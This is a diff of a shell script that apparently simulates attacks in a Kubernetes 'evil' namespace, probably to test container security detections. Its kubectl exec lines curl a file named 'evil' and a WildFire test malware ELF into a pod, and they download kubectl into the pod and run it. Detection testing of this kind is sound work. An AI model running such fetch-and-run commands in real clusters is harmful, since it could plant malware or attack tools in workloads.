@@ -3,6 +3,10 @@ PO=$(kubectl get po -n evil|grep evil| awk '{ print $1 }')
 echo "DL bad evil file"
 kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"
 
+echo "DL malware 0-day"
+kubectl exec $PO -n evil -- bash -c "curl https://wildfire.paloaltonetworks.com/publicapi/test/elf -o evil-0-day-WF"
+
+
 echo "Kubernetes attack"
 kubectl exec $PO -n evil -- bash -c "curl https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl -o kubectl; chmod +x ./kubectl ; ./kubectl version --client"
 
